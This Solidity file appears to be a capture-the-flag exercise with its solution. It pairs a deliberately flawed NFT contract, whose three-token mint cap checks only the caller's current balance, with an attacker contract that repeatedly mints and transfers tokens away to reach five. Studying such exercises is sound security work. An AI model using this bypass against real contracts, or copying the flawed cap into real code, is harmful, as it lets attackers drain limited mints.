// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.20;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint2 is ERC721 {
    uint256 public totalSupply;

    constructor() ERC721("Overmint2", "AT") {}

    function mint() external {
        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
        totalSupply++;
        _mint(msg.sender, totalSupply);
    }

    function success() external view returns (bool) {
        return balanceOf(msg.sender) == 5;
    }
}

contract Overmint2Attacker {
    address owner;

    Overmint2 overmintContract;

    constructor(address _overmint) {
        overmintContract = Overmint2(_overmint);
        owner = msg.sender;
    }

    function attack() external {
        while (overmintContract.balanceOf(owner) < 5) {
            overmintContract.mint();

            uint256 tokenId = overmintContract.totalSupply();

            overmintContract.transferFrom(address(this), owner, tokenId);
        }
    }
}
